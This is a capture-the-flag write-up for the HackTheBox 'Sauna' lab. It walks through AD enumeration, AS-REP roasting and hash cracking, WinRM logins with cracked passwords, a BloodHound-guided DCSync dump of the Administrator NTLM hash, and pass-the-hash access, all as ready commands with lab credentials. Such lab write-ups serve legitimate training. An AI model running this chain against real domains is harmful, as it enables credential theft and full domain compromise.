Active Directory – DCSync & Pass‑the‑Hash (HTB Sauna)
Category: Active Directory Enumeration & Abuse
Difficulty: Intermediate
Lab: Sauna (HackTheBox)

🧠 Objective
Enumerate the Active Directory environment, identify valid domain users, obtain credentials through AS‑REP roasting, escalate privileges to svc_loanmgr, analyze ACLs using BloodHound, perform a DCSync attack to dump the Administrator NTLM hash, and authenticate using Pass‑the‑Hash to retrieve the root flag.

🔍 Vulnerability Summary
The domain contains several misconfigurations that allow full compromise:

Publicly accessible About.html page leaks employee names.

Kerberos allows AS‑REP roasting for users without pre‑authentication.

Weak passwords allow lateral movement.

The service account svc_loanmgr has dangerous ACLs (GetChanges, GetChangesAll, DCSync).

These rights allow performing a DCSync attack to dump password hashes.

The Administrator NTLM hash enables Pass‑the‑Hash authentication.

💥 Exploitation
🔧 1. Nmap Scan
Code
nmap -sC -sV -oN sauna_scan 10.129.24.149
Identified services:

Port 80 — IIS web server

Port 88 — Kerberos

Port 389 — LDAP

Port 445 — SMB

Port 5985 — WinRM

🔧 2. Web Enumeration — About.html
Browsing the website reveals an About page listing employees:

Code
James
FSmith
Melanie
Steven
Sophie
These names form the basis of our user list.

🔧 3. Creating a User List
Code
fsmith
melanie
steven
sophie
james
🔧 4. Kerberos User Enumeration
Code
kerbrute userenum --dc 10.129.24.149 -d EGOTISTICAL-BANK.LOCAL users.txt
Valid users discovered:

Code
fsmith
svc_loanmgr
🔧 5. AS‑REP Roasting
Code
GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile users.txt -dc-ip 10.129.24.149
Crack the hash:

Code
hashcat -m 18200 hash.txt rockyou.txt
Credentials obtained:

Code
fsmith : Thestrokes23
🔧 6. WinRM Login as fsmith
Code
evil-winrm -i 10.129.24.149 -u fsmith -p Thestrokes23
🔧 7. Lateral Movement to svc_loanmgr
Code
dir C:\Users\fsmith\Desktop
Found credentials:

Code
svc_loanmgr : Moneymakestheworldgoround!
Login:

Code
evil-winrm -i 10.129.24.149 -u svc_loanmgr -p Moneymakestheworldgoround!
🔧 8. BloodHound Analysis
Run SharpHound:

Code
.\SharpHound.exe -c All
Upload the ZIP to BloodHound.

BloodHound reveals:

GetChanges

GetChangesAll

DCSync

for:

Code
svc_loanmgr → EGOTISTICAL-BANK.LOCAL
This confirms the ability to perform a DCSync attack.

🔧 9. DCSync Attack (Impacket)
Code
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@10.129.24.149
Administrator hash obtained:

Code
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
🔧 10. Pass‑the‑Hash (Administrator Login)
Code
evil-winrm -i 10.129.24.149 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
🔧 11. Retrieve the root flag
Code
cd C:\Users\Administrator\Desktop
type root.txt
📸 Screenshots

![Nmap Scan](./screenshots/nmapscan.png)
![AS-REP Hash Cracked](./screenshots/hashcracked.png)
![svc_loanmgr Password Located](./screenshots/svc_loanmanagerPasswordLocated.png)
![BloodHound DCSync](./screenshots/bloodhound.png)
![Impacket Administrator Hash Located](./screenshots/impackethashlocated.png)
![Evil-WinRM Administrator Login](./screenshots/evil-winrmAdministratorLogin.png)
![Evil-WinRM Administrator Shell](./screenshots/evil-winrmAdministratorHash.png)
![Administrator Hash Retrieved](./screenshots/AdministratorHashRetrieved.png)
